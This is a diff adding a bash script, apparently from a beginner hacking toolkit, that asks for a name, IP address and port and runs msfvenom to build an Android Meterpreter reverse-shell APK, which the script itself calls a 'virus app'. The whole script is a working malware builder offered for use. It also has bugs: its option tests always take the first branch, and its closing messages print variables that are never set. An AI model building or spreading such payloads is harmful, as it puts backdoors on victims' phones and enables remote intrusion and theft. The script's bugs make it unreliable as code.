@@ -1,0 +1,39 @@
+#!/bin/bash
+
+extension="reverse_tcp"
+
+	echo "what is the name you want to provide for your virus?"
+	read name
+	echo "what is the extension of the meterpreter session? [by default it is (reverse_tcp)]"
+	echo "a . reverse_tcp"
+	echo "b . reverse_http"
+	echo "c . reverse_https"
+	read extension
+	echo "what is your ip address (Ex :- 192.168.1.1)"
+	read ip
+	echo "what is the port you want to provide [Ex :- 4444]"
+	read port
+	cd ../Export
+	if [ "$extension" = "a" ] || [ "A" ];
+	then
+	msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $name.apk
+	elif [ "$extension" = "B" ] || [ "b" ];
+	then
+	msfvenom -p android/meterpreter/reverse_http LHOST=$ip LPORT=$port -o $name.apk
+	elif [ "$extension" = "C" ] || [ "c" ];
+	then
+	msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port -o $name.apk
+	fi
+	echo 
+	echo
+	echo "the virus app is successfully created"
+	echo "your ip is $IPADDRESS"
+	echo "your port is $PORT"
+	echo "the app is in Export direction of beginnerscript"
+	echo "your apk name is $APKNAME.apk"
+	echo "Subscribe to the newsletter for more Scripts"
+	echo "Thank You"
+	echo "The Script will go back to main menu in 3 sec"
+	sleep 3
+	cd ..
+	./MainScript.sh
